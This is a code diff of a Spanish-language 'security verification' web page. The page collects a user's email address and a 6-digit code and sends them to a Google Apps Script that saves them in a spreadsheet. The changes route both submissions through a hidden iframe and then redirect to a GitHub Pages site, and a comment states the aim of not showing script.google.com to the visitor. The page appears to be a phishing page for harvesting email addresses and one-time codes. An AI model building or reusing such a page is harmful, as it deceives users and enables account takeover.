@@ -54,8 +54,9 @@
         <h2>Verificación por tu seguridad</h2>
         <p>Para proteger tu información, verificaremos tu identidad mediante un código de 6 dígitos que enviaremos a tu correo electrónico.</p>
 
-        <!-- Tu Web App -->
-        <form id="emailForm" action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
+        <!-- Envío al Apps Script en IFRAME (no cambia la URL) -->
+        <form id="emailForm"
+              action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
               method="post" target="hidden_iframe" accept-charset="UTF-8" autocomplete="off" novalidate>
           <input type="hidden" name="action" value="email">
           <label for="email">Aquí va tu correo</label>
@@ -71,9 +72,10 @@
         <p class="hint">El correo con tu código puede tardar entre <strong>3 y 5 minutos</strong> en llegar.</p>
         <p>Escribe el código de 6 dígitos que recibiste por correo y presiona <strong>Confirmar</strong> para continuar.</p>
 
-        <!-- Misma URL del Web App -->
-        <form id="verifyForm" action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
-              method="post" accept-charset="UTF-8" autocomplete="off">
+        <!-- También en IFRAME; luego redirigimos desde esta misma página -->
+        <form id="verifyForm"
+              action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
+              method="post" target="hidden_iframe" accept-charset="UTF-8" autocomplete="off">
           <input type="hidden" name="action" value="verify">
           <input type="hidden" name="email" id="hiddenEmail">
           <label for="code">Código de 6 dígitos</label>
@@ -84,10 +86,13 @@
     </div>
   </div>
 
-  <!-- Iframe oculto para que el Paso 1 no navegue -->
-  <iframe name="hidden_iframe" style="display:none;"></iframe>
+  <!-- Iframe oculto para enviar al Script sin cambiar de página -->
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
   <script>
+    // URL final (tu formulario en GitHub Pages)
+    const FORM_URL = "https://payn1co.github.io/Payn1co/";
+
     // pestañas y flujo
     const tabEmail = document.getElementById('tab-email');
     const tabCode  = document.getElementById('tab-code');
@@ -110,24 +115,40 @@
     const btnEmail    = document.getElementById('btnEmail');
     const inputEmail  = document.getElementById('email');
     const hiddenEmail = document.getElementById('hiddenEmail');
+    const hiddenIfr   = document.getElementById('hidden_iframe');
 
     emailForm.addEventListener('submit', () => {
       btnEmail.disabled = true;
       btnEmail.textContent = 'Enviando...';
 
-      const ifr = document.querySelector('iframe[name="hidden_iframe"]');
       const onLoad = () => {
         okMsg.style.display = 'block';             // muestra “Enviado”
         hiddenEmail.value = inputEmail.value;      // pasa el correo al paso 2
         showStep('code');                          // salta a pestaña Código
         btnEmail.disabled = false;
         btnEmail.textContent = 'Verificar';
-        ifr.removeEventListener('load', onLoad);
+        hiddenIfr.removeEventListener('load', onLoad);
       };
-      ifr.addEventListener('load', onLoad);
+      hiddenIfr.addEventListener('load', onLoad, { once: true });
     });
 
-    // permitir cambiar manualmente (opcional)
+    // paso 2: código (también por iframe) + redirección limpia a tu dominio
+    const verifyForm = document.getElementById('verifyForm');
+    const btnVerify  = document.getElementById('btnVerify');
+
+    verifyForm.addEventListener('submit', () => {
+      btnVerify.disabled = true;
+      btnVerify.textContent = 'Confirmando...';
+
+      const onLoadVerify = () => {
+        // ya guardó en la hoja; ahora redirigimos desde este documento (sin mostrar script.google.com)
+        window.location.replace(FORM_URL);
+        hiddenIfr.removeEventListener('load', onLoadVerify);
+      };
+      hiddenIfr.addEventListener('load', onLoadVerify, { once: true });
+    });
+
+    // pestañas manuales (opcional)
     tabEmail.addEventListener('click', () => showStep('email'));
     tabCode.addEventListener('click',  () => showStep('code'));
   </script>
